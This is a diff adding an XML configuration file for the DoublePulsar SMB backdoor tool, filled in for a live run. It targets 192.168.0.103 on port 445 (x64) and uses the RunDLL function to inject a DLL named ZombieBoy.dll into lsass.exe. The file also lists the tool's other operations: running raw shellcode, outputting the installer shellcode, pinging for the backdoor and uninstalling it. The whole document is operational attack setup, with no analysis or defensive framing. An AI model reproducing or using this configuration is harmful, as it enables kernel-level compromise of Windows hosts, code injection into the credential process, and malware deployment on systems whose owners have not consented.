@@ -1,0 +1,83 @@
+<config xmlns="urn:trch" id="a748cf79831d6c2444050f18217611549fe3f619" configversion="1.3.1.0" name="Doublepulsar" version="1.3.1" schemaversion="2.0.0">
+  <inputparameters>
+    <parameter name="NetworkTimeout" description="Timeout for blocking network calls (in seconds).  Use -1 for no timeout." type="S16" format="Scalar" valid="true">
+      <default>60</default>
+      <value>60</value>
+    </parameter>
+    <parameter name="TargetIp" description="Target IP Address" type="IPv4" format="Scalar" valid="true">
+      <value>192.168.0.103</value>
+    </parameter>
+    <parameter name="TargetPort" description="Port used by the Double Pulsar back door" type="TcpPort" format="Scalar" valid="true">
+      <default>445</default>
+      <value>445</value>
+    </parameter>
+    <parameter name="LogFile" description="Where to write log file" type="String" format="Scalar" required="false"></parameter>
+    <parameter name="OutConfig" description="Where to write output parameters file" type="String" format="Scalar" valid="true">
+      <default>stdout</default>
+      <value>C:\Users\superman\Desktop\gogogo\impacket\examples\MS17010\logs.txt</value>
+    </parameter>
+    <parameter name="ValidateOnly" description="Stop execution after parameter validation" type="Boolean" format="Scalar" valid="true">
+      <default>false</default>
+      <value>false</value>
+    </parameter>
+    <paramchoice name="Protocol" description="Protocol for the backdoor to speak">
+      <default>SMB</default>
+      <value>SMB</value>
+      <paramgroup name="SMB" description="Ring 0 SMB (TCP 445) backdoor"></paramgroup>
+      <paramgroup name="RDP" description="Ring 0 RDP (TCP 3389) backdoor"></paramgroup>
+    </paramchoice>
+    <paramchoice name="Architecture" description="Architecture of the target OS">
+      <default>x86</default>
+      <value>x64</value>
+      <paramgroup name="x86" description="x86 32-bits"></paramgroup>
+      <paramgroup name="x64" description="x64 64-bits"></paramgroup>
+    </paramchoice>
+    <paramchoice name="Function" description="Operation for backdoor to perform">
+      <default>OutputInstall</default>
+      <value>RunDLL</value>
+      <paramgroup name="OutputInstall" description="Only output the install shellcode to a binary file on disk.">
+        <parameter name="OutputFile" description="Full path to the output file" type="String" format="Scalar"></parameter>
+      </paramgroup>
+      <paramgroup name="Ping" description="Test for presence of backdoor"></paramgroup>
+      <paramgroup name="RunDLL" description="Use an APC to inject a DLL into a user mode process.">
+        <parameter name="DllPayload" description="DLL to inject into user mode" type="LocalFile" format="Scalar" valid="true">
+          <value>C:\Users\superman\Desktop\gogogo\impacket\examples\MS17010\ZombieBoy.dll</value>
+        </parameter>
+        <parameter name="DllOrdinal" description="The exported ordinal number of the DLL being injected to call" type="U32" format="Scalar" valid="true">
+          <default>1</default>
+          <value>1</value>
+        </parameter>
+        <parameter name="ProcessName" description="Name of process to inject into" type="String" format="Scalar" valid="true">
+          <default>lsass.exe</default>
+          <value>lsass.exe</value>
+        </parameter>
+        <parameter name="ProcessCommandLine" description="Command line of process to inject into" type="String" format="Scalar" valid="true">
+          <default></default>
+          <value></value>
+        </parameter>
+      </paramgroup>
+      <paramgroup name="RunShellcode" description="Run raw shellcode">
+        <parameter name="ShellcodeFile" description="Full path to the file containing shellcode" type="LocalFile" format="Scalar"></parameter>
+        <parameter name="ShellcodeData" description="Full path to the file containing shellcode to run" type="LocalFile" format="Scalar"></parameter>
+      </paramgroup>
+      <paramgroup name="Uninstall" description="Remove's backdoor from system"></paramgroup>
+    </paramchoice>
+  </inputparameters>
+  <outputparameters>
+    <paramchoice name="Function" description="Operation for backdoor to perform">
+      <paramgroup name="OutputInstall" description="Only output the install shellcode to a file on disk.">
+        <parameter name="ShellcodeFile" description="Full path to the file containing Double Pulsar shellcode installer" type="String" format="Scalar"></parameter>
+        <parameter name="ShellcodeData" description="Full path to the file containing Double Pulsar shellcode installer" type="LocalFile" format="Scalar"></parameter>
+      </paramgroup>
+      <paramgroup name="Ping" description="Test for presence of backdoor">
+        <parameter name="Is64Bit" description="Is target 64 or 32 bit" type="U32" format="Scalar"></parameter>
+      </paramgroup>
+      <paramgroup name="RunDLL" description="Inject a DLL into a user mode process.">
+        <parameter name="Is64Bit" description="Is target 64 or 32 bit" type="U32" format="Scalar"></parameter>
+      </paramgroup>
+      <paramgroup name="Uninstall" description="Remove's backdoor from system">
+        <parameter name="Is64Bit" description="Is target 64 or 32 bit" type="U32" format="Scalar"></parameter>
+      </paramgroup>
+    </paramchoice>
+  </outputparameters>
+</config>
